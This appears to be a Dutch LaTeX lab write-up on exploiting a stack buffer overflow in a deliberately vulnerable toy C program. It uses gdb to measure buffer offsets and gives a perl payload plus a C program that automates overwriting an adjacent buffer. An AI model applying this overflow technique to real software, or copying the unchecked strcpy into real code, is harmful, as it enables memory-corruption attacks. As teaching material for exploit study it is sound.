\begin{enumerate}
  \item gcc-3.3 -g -o gokkenvoorlosers gokkenvoorlosers.c
  \item gdb -q gokkenvoorlosers
  \item (gdb) list
  	\begin{enumerate}
  	\item Door dit commando uit te voeren krijgen we een overzicht van de programma code
  	\item We zoeken de scharnierpunten in dit programma:
  		\begin{enumerate}
  		\item 1 argument: \textless bestandsnaam\textgreater
  		\item output
  		\item naam
  		\item strcpy(naam, bestandsnaam) op lijn 22
  		\item fprintf(fp, ...). De output wordt hier weggeschreven in gokverslaafden.txt
  			\begin{enumerate}
  			\item Initieel: docu ment	-10 000
  			\end{enumerate}
  		\end{enumerate}
  	\end{enumerate}
  \item (gdb) break 23
  	\begin{enumerate}
  	\item Adres van output bekijken
  	\item Adres van naam bekijken
  	\end{enumerate}
  \item (gdb) run test
  \item (gdb) x/x output
  	\begin{enumerate}
  	\item 0xbffff630
  	\end{enumerate}
  \item (gdb) x/x naam
  	\begin{enumerate}
  	\item 0xbffff5f0
  	\end{enumerate}
  \item (gdb) print 0xbffff630 - 0xbffff5f0
  	\begin{enumerate}
  	\item \$1 = 64
  	\end{enumerate}
  \item (gdb) run ``\$(perl -e `print ``A''x64 . ``test'' ')''
  	\begin{enumerate}
  	\item gokverslaafden.txt bevat nu ``test''
  	\end{enumerate}
  \item Succes! Nu moeten we een programma schrijven die dit automatiseert.
  \item Een voorbeeld oplossing zou het volgende kunnen zijn:
\end{enumerate}

\begin{lstlisting}
oplossing.c
------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char outputString[] = "Naj ed Nam\t8 000\nnajrda saalk\t10\nNet Nuiq\t5";

int main(int argc, int argv[]){
	char command[200] = "./gokkenvoorlosers \"$(perl -e 'print \"\x41\"x64 . \"";

	strcat(command, outputString);
	strcat(command, "\"')\"");

	system(command);
}

OUTPUT:
	cat gokverslaafden.txt
		Naj ed Nam		8 000
		najrda saalk	10
		Net Nuiq		5
\end{lstlisting}

\begin{lstlisting}
gokkenvoorlosers.c
------------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>

int main(int argc, char *argv[]){
	if(argc != 2){
		printf("Gebruik: %s <bestandsnaam>\n",argv[0]);
		exit(0);
	}

	schrijfBestand(argv[1]);

}

int schrijfBestand(char *bestandsnaam){
	char output[200];
	char naam[50];

	strcpy(output, "Docu Ment -10 000");

	strcpy(naam, bestandsnaam);	

	FILE *fp;
	fp=fopen("gokverslaafden.txt", "w");
	fprintf(fp, "%s\n", output);

	fclose(fp);
}
\end{lstlisting}